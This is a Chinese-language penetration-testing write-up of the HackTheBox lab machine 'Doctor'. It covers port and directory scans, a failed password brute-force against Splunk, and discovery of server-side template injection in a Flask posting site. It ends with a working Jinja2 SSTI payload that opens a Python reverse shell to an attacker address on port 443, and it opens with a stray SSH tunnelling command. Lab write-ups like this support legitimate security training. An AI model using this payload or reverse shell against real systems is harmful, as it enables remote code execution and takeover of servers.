
ssh -N -D 127.0.0.1:9050 root@207.246.124.194

# 服务探测

开放端口
```
┌──(root㉿ss)-[~]
└─# nmap -p- --open --min-rate=1000 10.10.10.209
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-23 04:35 EDT
Stats: 0:00:07 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 5.25% done; ETC: 04:37 (0:02:06 remaining)
Nmap scan report for 10.10.10.209
Host is up (0.077s latency).
Not shown: 65532 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8089/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 92.42 seconds
```

详细端口信息
```
┌──(root㉿ss)-[~]
└─# nmap -sV -Pn -A -O 10.10.10.209 -p 22,80,8089
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-23 04:39 EDT
Nmap scan report for 10.10.10.209
Host is up (0.075s latency).

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 59:4d:4e:c2:d8:cf:da:9d:a8:c8:d0:fd:99:a8:46:17 (RSA)
|   256 7f:f3:dc:fb:2d:af:cb:ff:99:34:ac:e0:f8:00:1e:47 (ECDSA)
|_  256 53:0e:96:6b:9c:e9:c1:a1:70:51:6c:2d:ce:7b:43:e8 (ED25519)
80/tcp   open  http     Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Doctor
|_http-server-header: Apache/2.4.41 (Ubuntu)
8089/tcp open  ssl/http Splunkd httpd
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: splunkd
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Not valid before: 2020-09-06T15:57:27
|_Not valid after:  2023-09-06T15:57:27
|_http-server-header: Splunkd
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.6 (92%), Linux 5.0 (92%), Linux 5.0 - 5.4 (91%), Linux 5.3 - 5.4 (91%), Linux 2.6.32 (91%), Linux 5.0 - 5.3 (90%), Crestron XPanel control system (90%), Linux 5.4 (89%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   76.72 ms 10.10.14.1
2   75.45 ms 10.10.10.209

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 52.56 seconds

```




# 8089
```
┌──(root㉿ss)-[~]
└─# python3 /root/dirsearch/dirsearch.py -e* -u https://10.10.10.209:8089

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak | HTTP method: GET | Threads: 30 | Wordlist size: 15492

Output File: /root/dirsearch/reports/10.10.10.209-8089/_22-05-23_04-47-55.txt

Error Log: /root/dirsearch/logs/errors-22-05-23_04-47-55.log

Target: https://10.10.10.209:8089/

[04:47:56] Starting: 
[04:52:30] 200 -   26B  - /robots.txt                                         
[04:52:32] 401 -  130B  - /services/config/databases.yml                      
[04:52:32] 401 -  130B  - /services                                           
[04:52:32] 401 -  130B  - /services/                                          
[04:53:02] 200 -    2KB - /v1                                                 
[04:53:02] 200 -    2KB - /v1.0                                               
[04:53:02] 200 -    2KB - /v2/                                                
[04:53:02] 200 -    2KB - /v2.0                                               
[04:53:02] 200 -    2KB - /v3/
[04:53:02] 200 -    2KB - /v4/
[04:53:02] 200 -    2KB - /v3                                                 
[04:53:02] 200 -    2KB - /v1.1                                               
[04:53:02] 200 -    2KB - /v1/
[04:53:03] 200 -    2KB - /v2                                                 
                                                                              
Task Completed

```



8089上的Splunk服务，在谷歌上找到下面这篇文章
```
https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/
```

但是需要一个用户凭据，尝试过常用信息，没有成功。爆破rockyou前10万，没有爆出密码



# 80
```
┌──(root㉿ss)-[~]
└─# python3 /root/dirsearch/dirsearch.py -e* -u http://10.10.10.209          

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, jsp, asp, aspx, do, action, cgi, pl, html, htm, js, json, tar.gz, bak | HTTP method: GET | Threads: 30 | Wordlist si

Output File: /root/dirsearch/reports/10.10.10.209/_22-05-23_04-40-30.txt

Error Log: /root/dirsearch/logs/errors-22-05-23_04-40-30.log

Target: http://10.10.10.209/

[04:40:30] Starting: 
[04:40:33] 400 -  304B  - /.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd            
[04:40:34] 301 -  309B  - /js  ->  http://10.10.10.209/js/                 
[04:40:36] 403 -  277B  - /.ht_wsr.txt                                     
[04:40:36] 403 -  277B  - /.htaccess.bak1
[04:40:36] 403 -  277B  - /.htaccess.orig
[04:40:36] 403 -  277B  - /.htaccess_extra
[04:40:36] 403 -  277B  - /.htaccess_orig
[04:40:36] 403 -  277B  - /.htaccess_sc
[04:40:36] 403 -  277B  - /.htaccessBAK
[04:40:36] 403 -  277B  - /.htaccessOLD2
[04:40:36] 403 -  277B  - /.htaccessOLD
[04:40:36] 403 -  277B  - /.htaccess.save
[04:40:36] 403 -  277B  - /.htaccess.sample
[04:40:36] 403 -  277B  - /.htpasswd_test                                  
[04:40:36] 403 -  277B  - /.htm
[04:40:36] 403 -  277B  - /.html
[04:40:36] 403 -  277B  - /.httr-oauth
[04:40:36] 403 -  277B  - /.htpasswds
[04:40:37] 403 -  277B  - /.php                                            
[04:40:55] 200 -   19KB - /about.html                                       
[04:43:37] 400 -  304B  - /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd       
[04:43:40] 200 -   19KB - /contact.html                                       
[04:43:50] 301 -  310B  - /css  ->  http://10.10.10.209/css/                  
[04:43:56] 301 -  312B  - /fonts  ->  http://10.10.10.209/fonts/              
[04:44:06] 200 -    3KB - /images/                                            
[04:44:06] 301 -  313B  - /images  ->  http://10.10.10.209/images/
[04:44:07] 200 -   19KB - /index.html                                         
[04:44:08] 200 -    3KB - /js/                                                
[04:44:56] 403 -  277B  - /server-status/                                     
[04:44:56] 403 -  277B  - /server-status 
```


80端口看起来都是一些静态页面

早contact页面找到一个邮箱：info@doctors.htb

把doctors.htb加入到```/etc/hosts```


打开```http://doctors.htb```跳转到一个登陆页面，这个页面之前用IP访问的时候无法访问到


登陆页面可以注册，注册一个测试账号：```max@1.com : 123456```

这个好像是doctors这个网站的一个内部员工留言网，可以创建账号，发帖子

网页源代码有一行注释的超链接

```
<a>archive still under beta testing<a class="nav-item nav-link" href="/archive">Archive</a>
```

/archive正在测试当中，但是打开显示空白页面，查看空白页面源代码。返回的是xml



# SSTI



使用curl访问这个域名

```
┌──(root💀kali)-[~]
└─# curl -v http://doctors.htb/          
*   Trying 10.10.10.209:80...
* Connected to doctors.htb (10.10.10.209) port 80 (#0)
> GET / HTTP/1.1
> Host: doctors.htb
> User-Agent: curl/7.83.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 302 FOUND
< Date: Mon, 23 May 2022 16:24:00 GMT
< Server: Werkzeug/1.0.1 Python/3.8.2
< Content-Type: text/html; charset=utf-8
< Content-Length: 237
< Location: http://doctors.htb/login?next=%2F
< Vary: Cookie
< Set-Cookie: session=eyJfZmxhc2hlcyI6W3siIHQiOlsiaW5mbyIsIlBsZWFzZSBsb2cgaW4gdG8gYWNjZXNzIHRoaXMgcGFnZS4iXX1dfQ.You1IA.vRcuhcqEW6Q_jcrvRuzD41Y6DAQ; HttpOnly; Path=/
< 
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>Redirecting...</title>
<h1>Redirecting...</h1>
* Connection #0 to host doctors.htb left intact
<p>You should be redirected automatically to target URL: <a href="/login?next=%2F">/login?next=%2F</a>.  If not click the link.
```

发现这个http server其实是python

我们nmap探测到的80的http server是 Apache httpd 2.4.41

说明其实是两个不同的站点

python网站有可能会出现服务器端模板注入


服务器端模板注入，本质上是用户的输入被当初了代码执行

[hacktrick](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)

> A server-side template injection occurs when an attacker is able to use native template syntax to inject a malicious payload into a template, which is then executed server-side


如何测试？

参考hacktrick里面测试的payload，我们可以分别在title和Content做测试

比如：

title：```{{7*7}}```

Content:```${7*7}```

注意提交后的回显页面没有成功显示注入，但是在```/archive```返回的xml页面里，是可以回显上面的注入的

```
<?xml version="1.0" encoding="UTF-8" ?>
	<rss version="2.0">
	<channel>
 	<title>Archive</title>
 	<item><title>49</title></item>

			</channel>

```

由上可知。title里面的```7*7```被当成了python代码执行



{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"10.10.16.4\",443)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2); p=subprocess.call([\"/bin/bash\", \"-i\"]);'").read().zfill(417)}}{%endif%}{% endfor %}